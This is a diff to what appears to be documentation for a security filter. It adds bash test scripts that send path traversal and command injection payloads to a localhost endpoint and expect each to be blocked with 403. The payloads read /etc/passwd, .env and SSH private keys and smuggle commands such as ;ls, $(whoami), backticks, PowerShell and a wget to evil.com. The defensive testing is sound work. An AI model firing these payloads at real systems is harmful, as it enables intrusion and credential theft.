@@ -183,7 +183,101 @@ echo ""
 echo "✅ All XSS attacks should be blocked (403)"
 ```
 
-### Example 6: Rate Limiting Test
+### Example 6: Path Traversal Tests
+
+```bash
+#!/bin/bash
+# test_path_traversal.sh
+
+echo "Testing Path Traversal Detection"
+echo "================================="
+
+# Test 1: Basic traversal
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/file?path=../../../etc/passwd")
+echo "Test 1: Basic traversal - Status: $RESPONSE"
+
+# Test 2: URL encoded traversal
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd")
+echo "Test 2: URL encoded - Status: $RESPONSE"
+
+# Test 3: Double encoded
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/file?path=%252e%252e%252f")
+echo "Test 3: Double encoded - Status: $RESPONSE"
+
+# Test 4: Sensitive file access
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/.htaccess")
+echo "Test 4: .htaccess access - Status: $RESPONSE"
+
+# Test 5: Environment file
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/config/.env")
+echo "Test 5: .env file - Status: $RESPONSE"
+
+# Test 6: SSH key access
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/file?path=~/.ssh/id_rsa")
+echo "Test 6: SSH key - Status: $RESPONSE"
+
+# Test 7: Null byte injection
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/file.txt%00.jpg")
+echo "Test 7: Null byte - Status: $RESPONSE"
+
+echo ""
+echo "✅ All path traversal attempts should return 403"
+```
+
+### Example 7: Command Injection Tests
+
+```bash
+#!/bin/bash
+# test_command_injection.sh
+
+echo "Testing Command Injection Detection"
+echo "===================================="
+
+# Test 1: Semicolon injection
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?cmd=test;ls")
+echo "Test 1: Semicolon (;) - Status: $RESPONSE"
+
+# Test 2: Pipe injection
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?cmd=test%7ccat")
+echo "Test 2: Pipe (|) - Status: $RESPONSE"
+
+# Test 3: AND operator
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?cmd=test%26%26whoami")
+echo "Test 3: AND (&&) - Status: $RESPONSE"
+
+# Test 4: OR operator
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?cmd=test%7c%7cid")
+echo "Test 4: OR (||) - Status: $RESPONSE"
+
+# Test 5: Command substitution $()
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/search?q=%24%28whoami%29")
+echo "Test 5: \$(command) - Status: $RESPONSE"
+
+# Test 6: Backtick substitution
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/search?q=%60id%60")
+echo "Test 6: \`command\` - Status: $RESPONSE"
+
+# Test 7: Shell path
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?shell=/bin/bash")
+echo "Test 7: /bin/bash - Status: $RESPONSE"
+
+# Test 8: Environment variable
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?path=%24PATH")
+echo "Test 8: \$PATH - Status: $RESPONSE"
+
+# Test 9: wget command
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/download?cmd=wget%20http://evil.com")
+echo "Test 9: wget - Status: $RESPONSE"
+
+# Test 10: PowerShell
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:6188/api/exec?cmd=powershell%20-c%20Get-Process")
+echo "Test 10: PowerShell - Status: $RESPONSE"
+
+echo ""
+echo "✅ All command injection attempts should return 403"
+```
+
+### Example 8: Rate Limiting Test
 
 ```
 #!/bin/bash
